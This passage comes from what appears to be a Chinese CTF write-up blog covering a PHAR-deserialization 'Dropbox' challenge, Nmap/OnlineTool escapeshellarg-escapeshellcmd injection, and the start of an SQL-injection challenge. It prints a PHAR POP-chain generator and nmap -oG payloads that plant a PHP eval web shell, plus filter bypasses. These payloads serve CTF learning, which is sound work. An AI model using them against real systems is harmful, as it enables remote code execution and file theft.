sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;#析构方法（在脚本结束之前运行）</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到user类中没有什么可以利用的点。</p>
<p>继续跟进FileList类</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;#构造方法</span><br><span class="line">        $this-&gt;files = array();#存储对应的file文件</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line">        $filenames = scandir($path);#给filenames遍历路径下所有的文件</span><br><span class="line"></span><br><span class="line">        $key = array_search(&quot;.&quot;, $filenames);#在数组中搜索&quot;.&quot;然后返回它的键值</span><br><span class="line">        unset($filenames[$key]);#删除该键值</span><br><span class="line">        $key = array_search(&quot;..&quot;, $filenames);#在数组中搜索&quot;..&quot;返回他的键值</span><br><span class="line">        unset($filenames[$key]);#</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;#遍历文件列表</span><br><span class="line">            $file = new File();#给每一个文件创建一个实例对象</span><br><span class="line">            $file-&gt;open($path . $filename);#调用file中的open方法，判断路径中的文件是否存在</span><br><span class="line">            array_push($this-&gt;files, $file);#将file的元素添加到栈尾</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] = array();#创建一个数组，里面有对应的文件信息</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">			#</span><span class="bash">__call()是一个魔术方法，当调用一个对象中的不能用的方法的时候就回执行这个函数。有两个参数：（方法名，（枚举数组）传给name的参数）</span></span><br><span class="line">    public function __call($func, $args) &#123;#当调用不可执行方法时，在index中调用name和size时会执行，获取其名称和大小存储到文件信息中</span><br><span class="line">        array_push($this-&gt;funcs, $func);#每个文件的元素到栈尾</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;#遍历文件的file对象</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();#将文件名也添加到文件信息中</span><br><span class="line">            # $this-&gt;results[1.png][Name] = $file-&gt;Name();</span><br><span class="line">            # $this-&gt;results[1.png][Name] = $file-&gt;Size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;	#析构方法</span><br><span class="line">        $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;#输出图片的对应的file信息</span><br><span class="line">            $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;;</span><br><span class="line">        $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;#遍历所有的文件信息</span><br><span class="line">            $table .= &#x27;&lt;tr&gt;&#x27;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;#输出字段名（Name,Size,Opt）</span><br><span class="line">                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;;</span><br><span class="line">            $table .= &#x27;&lt;/tr&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析结束，也没有直接的漏洞利用方法</p>
<p>继续跟进File类</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;#判断文件是否存在</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function name() &#123;#返回文件名</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function size() &#123;#返回文件大小</span><br><span class="line">        $size = filesize($this-&gt;filename);</span><br><span class="line">        $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;);</span><br><span class="line">        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function detele() &#123;#删除文件</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function close() &#123;#返回文件名的内容</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到里有一个close方法，里面调用的file_get_contents函数可以读取到我们需要的内容，这里可以想想办法构造漏洞，看了一下代码，在open方法中，调用了<code>file_exists</code>还有<code>is_dir</code>函数，而且在所有的网页中都没有过滤phar伪协议，可以构造一个phar反序列化漏洞</p>
<p><img src="/2022/02/28/Dropbox/7.png" alt="1"></p>
<p><strong>什么是phar反序列化</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。这样，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">简单理解 phar:// 就是一个类似 file:// 的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。</span><br></pre></td></tr></table></figure>



<p><strong>下面看一下文件的结构</strong></p>
<p>由四部分组成：</p>
<h6 id="1、stub：phar文件标识"><a href="#1、stub：phar文件标识" class="headerlink" title="1、stub：phar文件标识"></a>1、stub：phar文件标识</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;phar://phar.phar/index.php&#x27;</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。</p>
<p>比如：<code>$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</code>可以构造一个文件被识别为GIF文件</p>
<h6 id="2、-a-manifest-describing-the-contents"><a href="#2、-a-manifest-describing-the-contents" class="headerlink" title="2、 a manifest describing the contents"></a>2、 a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<h6 id="3、the-file-contents"><a href="#3、the-file-contents" class="headerlink" title="3、the file contents"></a>3、the file contents</h6><p>被压缩的文件内容</p>
<h6 id="4、-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#4、-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="4、[optional] a signature for verifying Phar integrity (phar file format only)"></a>4、[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件的末尾</p>
<p><img src="/2022/02/28/Dropbox/8.png" alt="1"></p>
<h5 id="尝试构造"><a href="#尝试构造" class="headerlink" title="尝试构造"></a>尝试构造</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data=<span class="string">&#x27;hello L1n!&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以生成一个phar的gif文件</p>
<p><img src="/2022/02/28/Dropbox/9.png" alt="1"></p>
<p>回到题目</p>
<p>跟进一下哪里用到了这个close方法，在User类中的析构方法中调用到了这个close方法，调用close方法的对象是db，而db是user开始的时候定义的一个公有对象，读取到文件之后，没办法回显，需要利用FileList中的__call方法（<code>__call()</code>是一个魔术方法，当调用一个对象中的不能用的方法的时候就回执行这个函数。有两个参数：）进行存储到result数组之中，然后它最后的析构方法可以将他输出到我们的文件里面。当我们访问close方法的时候，他不能用，那就会直接跳进call魔术方法之中执行file中的close方法，把我们想要读取文件的内容读取到result数组中，然后当FileList执行结束之前由析构方法输出flag， 而调用FileList中不存在的close方法的时候可以直接利用User类中的析构方法，生成一个FileList的实例对象</p>
<h3 id="构造pop链子"><a href="#构造pop链子" class="headerlink" title="构造pop链子"></a>构造pop链子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> file();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span><span class="comment">#因为不知道，这个flag的文件名是猜的</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;result = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">       	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="comment">//phar生成代码</span></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接运行函数生成phar.phar文件，上传到题目，抓包更改文件类型</p>
<p><img src="/2022/02/28/Dropbox/10.png" alt="1"></p>
<p>可以看到上传成功</p>
<p>接下来看一看download页面的源码</p>
<p>download.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到目录固定在了<code>:/etc:/tmp</code>路径中</p>
<p>这里不能直接读取到我们上传的文件</p>
<p>再看一下delete文件</p>
<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以直接伪协议读取到我们的内容</p>
<p>filename=phar://phar.png</p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯-朱雀组-Nmap</title>
    <url>/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/</url>
    <content><![CDATA[<h1 id="网鼎杯-朱雀组Nmap"><a href="#网鼎杯-朱雀组Nmap" class="headerlink" title="[网鼎杯]朱雀组Nmap"></a>[网鼎杯]朱雀组Nmap</h1><p>看到题目，想到了上次做到的OnlineTool</p>
<p>一样都是用到了Nmap这个脚本</p>
<p>翻到nmap中有一个-oG参数将命令参数写入自己定义的文件中</p>
<p>而且这里考到了escapeshellarg和escapeshellcmd一起使用的时候会造成单引号逃逸</p>
<p>escapeshellarg，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个’’ ，若已经用\转义，则会用并且用’’ 替换\，最后将整个变量用单引号包裹。<br>escapeshellcmd，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&quot;或\‘替”或’<br>但是先进行larg再进行cmd的时候因为前面先转义单引号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure>

<p>经过escapeshellarg进行单引号转义,再用单引号包裹连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>在进行escapeshellcmd转义对后面的单引号还有\进行转义</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>

<p>现在可以看到后面的参数是没有被包裹的这里面的\直接被变成了一个\，也就是说这个指令被分割成三个部分</p>
<p>127.0.0.1    ’ ’ 还有a =1&#39;</p>
<p>如果此时是进行curl指令那么就变成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1 -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>也就是以post方式传入a=1‘最终逃逸单引号</p>
<p>尝试一下上次构造的payload</p>
<p><code> &#39; &lt;?php @eval($_POST[&quot;a&quot;]）;?&gt; -oG hack.php&#39;</code></p>
<p><img src="/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/1.png" alt="1"></p>
<p>可以看到，被拦截了</p>
<p>但是代码是正确执行了，只是需要绕一下过滤</p>
<p>测试了一下，是因为过滤了php</p>
<p>那么我们直接&lt;?php替换成&lt;?=可以直接运行，然后把php文件转换成phtml文件，直接读取文件</p>
<p><img src="/2022/03/02/%E6%9C%B1%E9%9B%80%E6%9D%AF-Nmap/2.png" alt="1"></p>
<p>发现可以执行命令，那么直接执行cat /flag直接拿到flag</p>
]]></content>
      <tags>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>OnlineTool</title>
    <url>/2022/03/03/OnlineTool/</url>
    <content><![CDATA[<h1 id="OnlineTool"><a href="#OnlineTool" class="headerlink" title="OnlineTool"></a>OnlineTool</h1><p>昨天的朱雀杯提到了这个，想了一下自己好像没写wp，今天补一下</p>
<p>源码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到需要我们提供一个host，host会经过两层过滤</p>
<p>一层是<code>escapeshellarg</code>另一层是<code>escapeshellcmd</code>,escapeshellarg命令的含义是将给字符串增加一对单引号并且能引用或者转码任何已经存在的单引号,他要正常执行还需要在这中间包裹其中的符号来执行</p>
<p>比如说：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x27; -s -v a=1</span><br><span class="line">进行过滤之后就会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -s -v a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>而<code>escapeshellcmd</code>命令的含义是对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $\ \x0A \xFF</span><br><span class="line">’和&quot;仅在不配对的时候会进行转义</span><br></pre></td></tr></table></figure>

<p>这本来是没有什么问题的，但是搭配起来就会出现问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">比如说上面的escapeshellarg过滤之后的字符再进行escapeshellcmd过滤：</span><br><span class="line">也就是说上面的会变成</span><br><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -s -v a=1&#x27;</span><br><span class="line">这样就把上面的语句分成了三个部分：</span><br><span class="line">127.0.0.1    &#x27;空&#x27;   以及一个post方式传入的a=1&#x27;</span><br></pre></td></tr></table></figure>

<p>比如我们写一个:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1&#x27;</span><br><span class="line">经过escapeshellarg之后变成</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">在经过escapeshellcmd之后会变成(她会转义单独的引号还有其他的符号)</span><br><span class="line">也就是\和最后的’会被转义</span><br><span class="line">变成：</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br><span class="line">为了方便观看写到一起：</span><br><span class="line">&#x27;1&#x27;\&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>

<p>将他放到题目中去：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot; . &#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\\会被解析成一个\两个连续的单引号会被解析成一个空白</span><br><span class="line">如果我们输入的是</span><br><span class="line">1&#x27;命令&#x27;</span><br><span class="line">那么就会变成</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27;\\&#x27;&#x27; 命令 &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">也就是</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27; 命令 \</span><br><span class="line">我们输入的命令就会被nmap解析成条件，我们就可以写入一个nmap写文件参数执行。</span><br></pre></td></tr></table></figure>

<p>附上nmap的利用参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[&quot;a&quot;]); ?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>

<p>然后访问hack.php命令执行就行了</p>
]]></content>
  </entry>
  <entry>
    <title>SWPU2019-WEB1</title>
    <url>/2022/03/06/SWPU2019-WEB1/</url>
    <content><![CDATA[<h1 id="SWPY2019-WEB-1"><a href="#SWPY2019-WEB-1" class="headerlink" title="[SWPY2019]WEB 1"></a>[SWPY2019]WEB 1</h1><p>也算是通过题目学sql注入了</p>
<p>进入题目</p>
<p>发现是一个登录框，一直测了很久，发现还是得注册进去</p>
<p>似乎是没啥漏洞</p>
<p>进去发现，是一个广告申请系统</p>
<p>我们可以进行申请广告并进去查看</p>
<p>看了一下，好像漏洞出现再这个申请广告的地方，得先随便上传一些东西看看是啥样</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/3.png" alt="1"></p>
<p>看到我们写入的标题以及内容都显示在页面上，还可以进去查看内容</p>
<p>稍微测试了一下看看是xss还是sql</p>
<p>最终发现还是sql，在外面她会给你看你原来输入的东西，但是点进去之后</p>
<p>会执行sql语句</p>
<p>而且是单引号闭合，但是%27 还有#都被过滤了，没办法注释后面的内容</p>
<p>又写入一些数据测试一下发现</p>
<p>当我们输入两个<code>1&#39;123</code>时会返回‘123’报错，也就是说我们可以再构造一个单引号使得单引号，输入联合查询函数就可以运行我们的查询语句</p>
<p>运行联合查询的时候发现又过滤了<code>/**/</code>因为一半这个都能过，我就测试了一下，是可以的然后一直联合查询，但是数据一直不对，最后看到队列长度是22</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/1.png" alt="1"></p>
<p>点进去一看</p>
<p><img src="/2022/03/06/SWPU2019-WEB1/2.png" alt="1"></p>
<p>在2，3处回显了</p>
<p>也就是说我们需要在这里面构造我们的查询语句</p>
<p>但是在查询的时候发现information_schema被过滤了，去网上查了一下找了两种方法bypass</p>
